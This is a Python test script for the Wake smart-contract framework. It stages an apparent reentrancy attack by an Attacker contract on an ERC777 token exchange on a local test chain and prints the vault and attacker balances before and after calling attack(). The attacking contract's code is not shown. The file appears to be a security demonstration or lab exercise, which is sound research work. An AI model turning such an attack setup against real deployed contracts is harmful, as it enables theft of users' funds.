from wake.testing import *
from typing import List

from pytypes.contracts.erc777.vault import MyERC777Token, Exchange
from pytypes.contracts.erc777.attacker import Attacker
from pytypes.contracts.erc777.ERC1820Registry import ERC1820Registry

# for running this, you need to copy paste from erc777modified.sol to erc777 path in the node_module

@default_chain.connect()
def test_default():
    print("")
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]

    regs = ERC1820Registry.deploy()
    erc777 = MyERC777Token.deploy(1000*(10**18), [victim], regs.address, from_=victim)

    exchange = Exchange.deploy(erc777, value="1000 ether")

    erc777.transfer(exchange, 1000*(10**18), from_=victim)
    
    atContract = Attacker.deploy(regs.address, erc777.address, exchange.address, value="100 ether", from_=attacker)
    print("valult token  : ", erc777.balanceOf(exchange))
    print("valult eth    : ", exchange.balance)
    print("attacker token: ", erc777.balanceOf(atContract))
    print("attacker eth  : ", atContract.balance)

    print("---------------------attack---------------------")

    atContract.attack()
    print("valult token  : ", erc777.balanceOf(exchange))
    print("valult eth    : ", exchange.balance)
    print("attacker token: ", erc777.balanceOf(atContract))
    print("attacker eth  : ", atContract.balance)